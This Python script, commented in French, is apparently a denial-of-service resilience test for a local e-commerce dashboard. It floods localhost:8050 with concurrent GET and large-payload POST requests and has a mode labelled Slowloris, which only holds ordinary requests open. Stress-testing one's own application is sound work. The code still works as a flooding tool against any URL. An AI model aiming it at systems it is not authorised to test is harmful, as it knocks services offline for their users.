#!/usr/bin/env python3
"""
Test DDoS avec Python - Application Layer Attack
Test de résistance de l'application sous charge intense
"""

import asyncio
import aiohttp
import time
from datetime import datetime
import sys

TARGET_URL = 'http://localhost:8050'
CONCURRENT_REQUESTS = 200  # Nombre de requêtes simultanées
TOTAL_REQUESTS = 10000     # Total de requêtes à envoyer
ATTACK_TYPE = 'http_flood' # http_flood, slowloris, post_flood

class DDoSTester:
    def __init__(self, target, concurrency, total):
        self.target = target
        self.concurrency = concurrency
        self.total = total
        self.success = 0
        self.failed = 0
        self.start_time = None
        
    async def http_get_attack(self, session, request_id):
        """Attaque HTTP GET simple"""
        try:
            async with session.get(self.target, timeout=5) as response:
                if response.status < 500:
                    self.success += 1
                else:
                    self.failed += 1
                return response.status
        except Exception as e:
            self.failed += 1
            return None
    
    async def http_post_attack(self, session, request_id):
        """Attaque HTTP POST (plus gourmande en ressources)"""
        try:
            payload = {
                'username': f'test_user_{request_id}',
                'password': 'x' * 1000  # Payload large
            }
            async with session.post(
                f'{self.target}/login',
                json=payload,
                timeout=5
            ) as response:
                if response.status < 500:
                    self.success += 1
                else:
                    self.failed += 1
                return response.status
        except Exception as e:
            self.failed += 1
            return None
    
    async def slowloris_attack(self, session, request_id):
        """Attaque Slowloris - garde les connexions ouvertes"""
        try:
            # Ouvre une connexion et envoie des données très lentement
            headers = {
                'User-Agent': f'SlowAttacker-{request_id}',
                'Connection': 'keep-alive'
            }
            async with session.get(
                self.target,
                headers=headers,
                timeout=300  # Garde la connexion longtemps
            ) as response:
                # Lire très lentement
                await asyncio.sleep(10)
                await response.read()
                self.success += 1
                return response.status
        except Exception:
            self.failed += 1
            return None
    
    async def run_attack_batch(self, attack_type='http_flood'):
        """Lance un batch de requêtes concurrentes"""
        connector = aiohttp.TCPConnector(limit=self.concurrency)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            for i in range(self.total):
                if attack_type == 'http_flood':
                    task = self.http_get_attack(session, i)
                elif attack_type == 'post_flood':
                    task = self.http_post_attack(session, i)
                elif attack_type == 'slowloris':
                    task = self.slowloris_attack(session, i)
                else:
                    task = self.http_get_attack(session, i)
                
                tasks.append(task)
                
                # Afficher la progression
                if (i + 1) % 100 == 0:
                    print(f"[*] Envoyé: {i+1}/{self.total} requêtes | "
                          f"✅ {self.success} | ❌ {self.failed}")
            
            # Attendre toutes les requêtes
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def monitor_attack(self):
        """Monitore l'attaque en temps réel"""
        while self.success + self.failed < self.total:
            await asyncio.sleep(2)
            elapsed = time.time() - self.start_time
            rate = (self.success + self.failed) / elapsed if elapsed > 0 else 0
            print(f"\r[STATS] Temps: {elapsed:.1f}s | "
                  f"Rate: {rate:.1f} req/s | "
                  f"✅ {self.success} | ❌ {self.failed}", 
                  end='', flush=True)
    
    def run(self, attack_type='http_flood'):
        """Lance le test DDoS"""
        print("="*70)
        print("🎯 TEST DE RÉSISTANCE DDoS")
        print("="*70)
        print(f"Target: {self.target}")
        print(f"Attack Type: {attack_type}")
        print(f"Concurrent Requests: {self.concurrency}")
        print(f"Total Requests: {self.total}")
        print()
        print("⚠️  AVERTISSEMENT: Test sur votre système local uniquement!")
        print()
        
        # Countdown
        for i in range(3, 0, -1):
            print(f"Démarrage dans {i}...", end='\r', flush=True)
            time.sleep(1)
        
        print("\n[*] Attaque lancée!\n")
        self.start_time = time.time()
        
        # Lancer l'attaque
        asyncio.run(self.run_attack_batch(attack_type))
        
        # Statistiques finales
        elapsed = time.time() - self.start_time
        total_sent = self.success + self.failed
        rate = total_sent / elapsed if elapsed > 0 else 0
        
        print("\n\n" + "="*70)
        print("📊 RÉSULTATS DU TEST")
        print("="*70)
        print(f"Durée totale: {elapsed:.2f}s")
        print(f"Requêtes envoyées: {total_sent}")
        print(f"✅ Succès: {self.success} ({self.success/total_sent*100:.1f}%)")
        print(f"❌ Échecs: {self.failed} ({self.failed/total_sent*100:.1f}%)")
        print(f"📈 Taux moyen: {rate:.1f} req/s")
        print()
        
        if self.failed > total_sent * 0.5:
            print("🔴 L'application semble vulnérable au DDoS!")
            print("   Plus de 50% des requêtes ont échoué.")
        elif self.failed > total_sent * 0.2:
            print("🟠 L'application montre des signes de faiblesse.")
            print("   20-50% des requêtes ont échoué.")
        else:
            print("✅ L'application résiste bien à la charge!")
            print("   Moins de 20% d'échecs.")
        
        print()
        print("🔍 Vérifications recommandées:")
        print("  1. Vérifier si l'app répond: curl http://localhost:8050")
        print("  2. Voir les logs: docker logs ecommerce-dashboard --tail 50")
        print("  3. Métriques CPU/RAM: docker stats ecommerce-dashboard --no-stream")
        print("  4. Dashboard Grafana: http://localhost:3000")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        attack_type = sys.argv[1]
    else:
        attack_type = 'http_flood'
    
    print("\nTypes d'attaque disponibles:")
    print("  - http_flood: Flood HTTP GET classique")
    print("  - post_flood: Flood HTTP POST avec payload")
    print("  - slowloris: Attaque Slowloris (connexions lentes)")
    print()
    
    tester = DDoSTester(
        target=TARGET_URL,
        concurrency=CONCURRENT_REQUESTS,
        total=TOTAL_REQUESTS
    )
    
    tester.run(attack_type=attack_type)
